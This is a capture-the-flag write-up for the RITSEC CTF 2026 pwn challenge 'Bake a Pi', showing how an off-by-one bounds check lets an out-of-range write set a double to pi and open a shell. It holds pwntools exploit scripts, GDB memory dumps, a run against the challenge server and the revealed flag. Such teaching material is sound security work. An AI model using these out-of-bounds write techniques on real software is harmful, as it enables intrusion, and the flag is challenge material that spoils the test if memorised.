+++
title = 'RITSEC CTF 2026 Pwn Writeup: Bake a Pi'
description = 'Complete Writeup for RITSEC CTF 2026 Pwn Challenge Bake a Pi'
date = 2026-04-06
author = 'Shruti Priya'
+++

**Author: Shruti Priya**

Hello and welcome to another writeup. This is a walkthrough to the solution for RITSEC CTF 2026 Pwn challenge: [Bake a Pi](https://ctfd.ritsec.club/challenges#Bake%20a%20Pi-55). The challenge utilises off-by-one errors often seen in C-language code. Let's get started.

## Understanding the binary

I first run the binary itself to look at what the program does on surface level.

```bash
> ./pi.bin    
I want to create the perfect pi recipe, but can't quite get it right...
Can you help me bake the perfect pi?

------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: S
0. 1 large pi crust
1. 7 apples, sliced
2. 1/2 cup granulated sugar
3. 2 tbs flour
4. 1 tsp ground cinnamon
5. 1/8 tsp ground nutmeg
6. 1 tbs lemon juice
7. 1 large egg
------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: C
Which ingredient would you like to change?: 1
Enter ingredient: 1 apple
------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: S
0. 1 large pi crust
1. 1 apple
2. 1/2 cup granulated sugar
3. 2 tbs flour
4. 1 tsp ground cinnamon
5. 1/8 tsp ground nutmeg
6. 1 tbs lemon juice
7. 1 large egg
------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: 
```

There are 8 ingredients for the _pi_ and we can manipulate the ingredients by choosing an index number. I now disassemble the binary `pi.bin` in IDA and look at the pseudocode. The program checks for a specific value and if this checks returns `true`, it drops us into a shell.

```c
if ( *(double *)&pi == 3.141592653589793 )
        {
          puts("Yummy! This is the perfect pi!");
          execl("/bin/bash", "/bin/bash", 0);
        }
```

So we need to set the value of _pi_. Another interesting function is where the program allows users to change ingredients.

```c
if ( v4 == 67 )
    {
      printf("Which ingredient would you like to change?: ");
      __isoc99_scanf("%u%*c", &v5);
      if ( v5 <= 8 )
      {
        printf("Enter ingredient: ");
        fgets(&ingredients[32 * v5], 32, stdin);
        v3 = v5;
        ingredients[32 * v3 - 1 + strlen(&ingredients[32 * v5])] = 0;
      }
      else
      {
        puts("The recipe doesn't have that many ingredients");
      }
    }
```

Notice how the program checks the index number to be _less than or equal to 8_. However, given that the index numbers in C begin with 0, the maximum index number for the ingredients would be 7. This looks like an [off-by-one error](https://en.wikipedia.org/wiki/Off-by-one_error) where a small miscalculation in the code can allow users to manipulate out of bounds memory.

Let's hop into GDB and figure out how we can manipulate this. Just to make our lives a bit easier, we can create a simple Python script to interact with the program in GDB.

```python
#!/usr/bin/python
from pwn import *

context.arch = "amd64"
p = gdb.debug("./pi.bin", '''
               b *main+406
               ''')

p.sendline(b'C')
p.sendline(b"8")

payload = b'a' * 8
p.sendline(payload)

p.interactive()
```

Now, looking at the memory structure in GDB, the `pi` value is stored right after the `ingredients`. The `ingredients` array only has 8 elements, so when we send the index value 8, the program interprets it as the _9th_ element. 

If this was a Python program, we would have had an `Index out of range` error. But since this is C, we can successfully manipulate the 9th element. I have set the `pi`'s value to be `aaaaaaaa\x0a`

```bash
(remote) gef_ x/34gx 0x404080
0x404080 <ingredients>: 0x20656772616c2031      0x7473757263206970
0x404090 <ingredients+16>:      0x0000000000000000      0x0000000000000000
0x4040a0 <ingredients+32>:      0x73656c7070612037      0x646563696c73202c
0x4040b0 <ingredients+48>:      0x0000000000000000      0x0000000000000000
0x4040c0 <ingredients+64>:      0x2070756320322f31      0x74616c756e617267
0x4040d0 <ingredients+80>:      0x7261677573206465      0x0000000000000000
0x4040e0 <ingredients+96>:      0x6c66207362742032      0x000000000072756f
0x4040f0 <ingredients+112>:     0x0000000000000000      0x0000000000000000
0x404100 <ingredients+128>:     0x7267207073742031      0x6e696320646e756f
0x404110 <ingredients+144>:     0x0000006e6f6d616e      0x0000000000000000
0x404120 <ingredients+160>:     0x2070737420382f31      0x6e20646e756f7267
0x404130 <ingredients+176>:     0x00000067656d7475      0x0000000000000000
0x404140 <ingredients+192>:     0x656c207362742031      0x6369756a206e6f6d
0x404150 <ingredients+208>:     0x0000000000000065      0x0000000000000000
0x404160 <ingredients+224>:     0x20656772616c2031      0x0000000000676765
0x404170 <ingredients+240>:     0x0000000000000000      0x0000000000000000
0x404180 <pi>:  0x6161616161616161      0x000000000000000a
```

## Setting the pi value

The program doesn't want the `pi` to be `aaaaaaaa\x0a` but it wants a specific _double_ value. Since the program interprets `pi` as a double, let's also send the value as a double.

Extending the Python script to use `struct.pack()`.

```python
#!/usr/bin/python
from pwn import *
import struct

context.arch = "amd64"
p = gdb.debug("./pi.bin", '''
               b *main+406
               ''')

p.sendline(b'C')
p.sendline(b"8")

val = 3.141592653589793
payload = struct.pack("<d", val)
p.sendline(payload)

p.sendline(b'T')
p.interactive()
```

Now, we have the hex interpretation of `pi` value in the memory. I also send the `T` option to actually trigger shell execution.

```bash
(remote) gef_ x/34gx 0x404080
0x404080 <ingredients>: 0x20656772616c2031      0x7473757263206970
0x404090 <ingredients+16>:      0x0000000000000000      0x0000000000000000
0x4040a0 <ingredients+32>:      0x73656c7070612037      0x646563696c73202c
0x4040b0 <ingredients+48>:      0x0000000000000000      0x0000000000000000
0x4040c0 <ingredients+64>:      0x2070756320322f31      0x74616c756e617267
0x4040d0 <ingredients+80>:      0x7261677573206465      0x0000000000000000
0x4040e0 <ingredients+96>:      0x6c66207362742032      0x000000000072756f
0x4040f0 <ingredients+112>:     0x0000000000000000      0x0000000000000000
0x404100 <ingredients+128>:     0x7267207073742031      0x6e696320646e756f
0x404110 <ingredients+144>:     0x0000006e6f6d616e      0x0000000000000000
0x404120 <ingredients+160>:     0x2070737420382f31      0x6e20646e756f7267
0x404130 <ingredients+176>:     0x00000067656d7475      0x0000000000000000
0x404140 <ingredients+192>:     0x656c207362742031      0x6369756a206e6f6d
0x404150 <ingredients+208>:     0x0000000000000065      0x0000000000000000
0x404160 <ingredients+224>:     0x20656772616c2031      0x0000000000676765
0x404170 <ingredients+240>:     0x0000000000000000      0x0000000000000000
0x404180 <pi>:  0x400921fb54442d18      0x000000000000000a
```

Continuing execution, the program correctly drops me into a shell.

```bash
> ./exploit.py  
[+] Starting local process '/usr/bin/gdbserver': pid 48994
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pi.bin', '-x', '/tmp/pwnlib-gdbscript-j9w7zsnn.gdb']
[*] Switching to interactive mode
I want to create the perfect pi recipe, but can't quite get it right...
Can you help me bake the perfect pi?

------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: Which ingredient would you like to change?: Enter ingredient: ------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: Yummy! This is the perfect pi!
$ 
```

## Crafting final exploit

We have all the _ingredients_ (pun intended) so let's use this exploit on the server and get the flag.

```python
#!/usr/bin/python
from pwn import *
import struct

context.arch = "amd64"

host = "bake-a-pi.ctf.ritsec.club" 
port = 1555

#p = gdb.debug("./pi.bin", '''
#               b *main+406
#               ''')

#p = process("./pi.bin")
p = remote(host, port)

p.sendline(b'C')
p.sendline(b"8")

val = 3.141592653589793
payload = struct.pack("<d", val)
p.sendline(payload)

p.sendline(b'T')
p.interactive()
```

Finally running this exploit:

```bash
> ./exploit.py 
[+] Opening connection to bake-a-pi.ctf.ritsec.club on port 1555: Done
[*] Switching to interactive mode
I want to create the perfect pi recipe, but can't quite get it right...
Can you help me bake the perfect pi?

------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: Which ingredient would you like to change?: Enter ingredient: ------------------------------------------------------------
(S)how recipe, (C)change ingredient, (T)aste test: Yummy! This is the perfect pi!
$ ls
flag.txt
run
$ cat flag.txt
RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}
$  
```

And, `Bake a Pi` is pwned. Thank you for reading and I will see you in the next writeup!